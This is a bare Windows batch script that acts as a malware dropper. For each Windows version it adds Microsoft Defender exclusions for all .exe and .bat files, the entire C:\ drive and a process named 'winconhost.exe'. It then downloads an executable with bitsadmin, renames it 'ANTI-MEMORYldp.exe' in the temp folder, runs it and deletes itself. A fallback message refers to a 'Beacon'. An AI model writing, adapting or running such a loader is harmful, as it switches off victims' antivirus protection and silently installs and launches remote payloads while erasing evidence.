@echo off

set Version=

ver | findstr /i "6.1." > nul && set Version=Windows 7
ver | findstr /i "6.2." > nul && set Version=Windows 8
ver | findstr /i "6.3." > nul && set Version=Windows 8.1
ver | findstr /i "10.0." > nul && set Version=Windows 10
ver | findstr /i "10.0.22000." > nul && set Version=Windows 11

if "%Version%" == "Windows 7" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\ANTI-MEMORYldp.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else if "%Version%" == "Windows 8" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\ANTI-MEMORYldp.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else if "%Version%" == "Windows 8.1" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\ANTI-MEMORYldp.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else if "%Version%" == "Windows 10" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\ANTI-MEMORYldp.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else if "%Version%" == "Windows 11" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\ANTI-MEMORYldp.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else (
    echo Beacon unble to read System Files
)
